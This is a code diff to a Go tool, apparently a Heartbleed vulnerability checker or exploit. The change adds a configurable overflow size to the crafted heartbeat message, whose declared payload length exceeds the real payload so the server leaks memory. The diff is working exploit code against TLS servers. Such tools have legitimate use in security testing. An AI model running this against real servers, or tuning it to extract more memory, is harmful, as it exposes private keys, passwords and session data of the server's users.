@@ -14,6 +14,7 @@ import (
 type Target struct {
 	HostIp   string
 	Service string
+	OverflowSize int
 }
 
 var Safe = errors.New("heartbleed: no response or payload not found")
@@ -27,13 +28,13 @@ var padding = []byte("YELLOW SUBMARINE")
 //    opaque payload[HeartbeatMessage.payload_length];
 //    opaque padding[padding_length];
 // } HeartbeatMessage;
-func buildEvilMessage(payload []byte) []byte {
+func buildEvilMessage(payload []byte, overflowSize int) []byte {
 	buf := bytes.Buffer{}
 	err := binary.Write(&buf, binary.BigEndian, uint8(1))
 	if err != nil {
 		panic(err)
 	}
-	err = binary.Write(&buf, binary.BigEndian, uint16(len(payload)+100))
+	err = binary.Write(&buf, binary.BigEndian, uint16(len(payload)+overflowSize))
 	if err != nil {
 		panic(err)
 	}
@@ -86,7 +87,7 @@ func Heartbleed(tgt *Target, payload []byte) (out []byte, err error) {
 
 	var vuln = make(chan bool, 1)
 	buf := new(bytes.Buffer)
-	err = conn.SendHeartbeat([]byte(buildEvilMessage(payload)), heartbleedCheck(conn, buf, vuln))
+	err = conn.SendHeartbeat([]byte(buildEvilMessage(payload, tgt.OverflowSize)), heartbleedCheck(conn, buf, vuln))
 	if err != nil {
 		return
 	}
